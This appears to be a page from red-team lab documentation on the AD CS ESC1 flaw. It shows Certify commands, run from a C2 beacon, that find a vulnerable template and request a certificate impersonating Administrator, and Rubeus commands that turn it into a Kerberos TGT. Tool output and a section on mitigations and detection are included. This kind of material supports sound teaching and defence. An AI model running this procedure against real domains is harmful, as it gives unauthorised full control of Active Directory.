---
title: "Misconfigured 'Client Authentication' Templates"
date: 2026-09-25
weight: 5
type: docs
tags:
  - AD CS
  - Certificate Templates
  - ESC1
  - Active Directory
---

## What ESC1 is

ESC1 is a privilege-escalation condition that arises when an attacker can enrol for a certificate that both enables client authentication through its EKU and lets the requestor supply the subject. The combination is the whole problem: if you can name the account and the certificate is valid for authentication, you can request a certificate as anyone.

Enumerating the templates surfaces the condition, and Certify spells out exactly why the template qualifies:

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=arcadia,DC=local'
[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
[*] Listing info about the enterprise certificate authority 'ARCADIA Root CA'

    [...snip...]

[*] Certificate templates found using the current filter parameters:

    Template Name                         : ESC1
    Enabled                               : True
    Publishing CAs                        : hq-ca-01.arcadia.local\ARCADIA Root CA
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Client Authentication
    Certificate Application Policies      : Client Authentication
    Vulnerabilities
      ESC1                                : The template has a client authentication EKU and allows enrollees to supply subject.
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ARCADIA\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
      Object Control Permissions
```

Several settings line up to make this exploitable:

- **`ENROLLEE_SUPPLIES_SUBJECT` is set.** The certificate's subject comes from the requestor rather than being populated from Active Directory, which is what lets an attacker name an arbitrary account.
- **No approval gate.** *Manager Approval Required* is False and *Authorized Signatures Required* is 0, so a certificate can be obtained with no manual intervention.
- **Client Authentication is present in the EKU.** Other EKUs that work equally well here include PKINIT Client Authentication, Smart Card Logon, Any Purpose, Subordinate CA, and a blank or empty EKU field.
- **Enrolment is open to *Domain Users*,** meaning any authenticated principal can request from the template.

## Abusing it

Exploitation is a single request with Certify, supplying the account to impersonate through the SAN:

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "hq-ca-01.arcadia.local\ARCADIA Root CA" --template ESC1 --upn Administrator --quiet

[*] Action: Request a certificate
[*] Current user context    : ARCADIA\bmarsh
[*] No subject name specified, using current context as subject.
[*] Template                : ESC1
[*] Subject                 : CN=Ben Marsh, CN=Users, DC=arcadia, DC=local
[*] Subject Alt Name(s)     : Administrator
[*] Certificate Authority   : hq-ca-01.arcadia.local\ARCADIA Root CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 3

[*] Certificate (PFX)       :

MIACAQ[...snip...]AAAAA=

Certify completed in 00:00:20.3128203
```

Where:

- `--ca` is the target CA for the request.
- `--template` is the certificate template to request (each template here is named after the vulnerability it demonstrates).
- `--upn` is the Subject Alternative Name for the request, and is where the account to impersonate is specified.

The result is a base64-encoded PFX certificate, which feeds straight into Rubeus' `asktgt` command to obtain a TGT as the impersonated user:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:ARCADIA.LOCAL /certificate:MIACAQ[...snip...]AAAAA= /enctype:aes256 /nowrap

[*] Action: Ask TGT
[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Ben Marsh, CN=Users, DC=arcadia, DC=local 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'ARCADIA.LOCAL\Administrator'
[*] Using domain controller: 172.16.40.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGjj[...snip...]5DT00=

  ServiceName              :  krbtgt/ARCADIA.LOCAL
  ServiceRealm             :  ARCADIA.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  ARCADIA.LOCAL
  StartTime                :  27/02/2026 14:34:29
  EndTime                  :  28/02/2026 00:34:29
  RenewTill                :  06/03/2026 14:34:29
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  2krZuW8ARsvHIk02SXr9Ctk+iNQyyGPDQSJDLg5fNVs=
  ASREP (key)              :  E96EC749AE68D50100A2C5954E194D85973368B9D5B485122514CBBEA56687FA
```

With a TGT for Administrator, the account is fully compromised.

## Defensive considerations

ESC1 comes down to two settings that are dangerous specifically in combination: a client-authentication EKU and enrollee-supplied subjects. Wherever a template allows the requestor to supply the subject, require manager approval or authorised signatures so that issuance is not automatic, and restrict enrolment to a small, trusted group rather than broad principals such as *Domain Users* or *Authenticated Users*. Better still, avoid `ENROLLEE_SUPPLIES_SUBJECT` altogether on templates that grant authentication EKUs, letting the subject be built from Active Directory instead. Enabling the strong certificate mapping enforcement introduced to address CVE-2022-26923 also limits how loosely a certificate's SAN can be mapped to an account. For detection, certificate requests where the SAN names a different, more privileged principal than the requesting user are a high-signal indicator worth alerting on, as is any subsequent PKINIT authentication as a privileged account.

## Further reading

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [GhostPack Certify](https://github.com/GhostPack/Certify)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)